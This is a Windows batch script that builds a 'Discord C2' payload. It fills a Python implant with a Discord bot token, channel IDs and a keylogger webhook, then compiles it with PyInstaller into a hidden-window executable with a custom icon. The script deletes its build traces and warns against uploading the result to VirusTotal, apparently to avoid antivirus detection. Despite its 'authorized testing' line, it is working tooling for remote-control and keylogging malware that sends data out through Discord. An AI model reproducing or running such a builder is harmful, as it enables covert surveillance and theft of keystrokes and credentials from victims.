@echo off
echo ===============================================
echo Discord C2 Quick Builder - Using Defaults
echo ===============================================
echo.

REM Check if UV is installed
uv --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Installing UV package manager...
    powershell -Command "& {Invoke-RestMethod https://astral.sh/uv/install.ps1 | Invoke-Expression}"
    if %errorlevel% neq 0 (
        echo ERROR: Failed to install UV!
        pause
        exit /b 1
    )
)

echo [+] Setting up environment and dependencies...
uv sync

echo [+] Building payload with default configuration...
echo   - Name: d3
echo   - Guild ID: 1375935187250057216
echo   - Channel ID: 1375935188265209989
echo   - Bot Token: YOUR_BOT_TOKEN...
echo   - Webhook: YOUR_WEBHOOK_URL...

REM Create configured payload
copy discord_payload.py d3.py >nul

REM Replace placeholders
powershell -Command "(Get-Content 'd3.py') -replace '\{GUILD_ID\}', 'YOUR_GUILD_ID' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{BOT_TOKEN\}', 'YOUR_BOT_TOKEN' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{CHANNEL_ID\}', 'YOUR_CHANNEL_ID' | Set-Content 'd3.py'"
powershell -Command "(Get-Content 'd3.py') -replace '\{KEYLOGGER_WEBHOOK\}', 'YOUR_WEBHOOK_URL' | Set-Content 'd3.py'"

echo [+] Installing PyInstaller and building executable...
uv add pyinstaller
if not exist "dist" mkdir dist
uv run pyinstaller --onefile --noconsole --icon=img/exe_file.ico --name=d3 --distpath=dist d3.py

if %errorlevel% equ 0 (
    echo.
    echo ✅ SUCCESS! Executable created: dist\d3.exe
    del d3.py >nul 2>&1
    del d3.spec >nul 2>&1
    if exist "build" rmdir /s /q build >nul 2>&1
    echo.
    echo Ready to deploy! Remember:
    echo - Test in isolated environment
    echo - Use only for authorized testing
    echo - Do not upload to VirusTotal
) else (
    echo ❌ Build failed! Check errors above.
)

pause
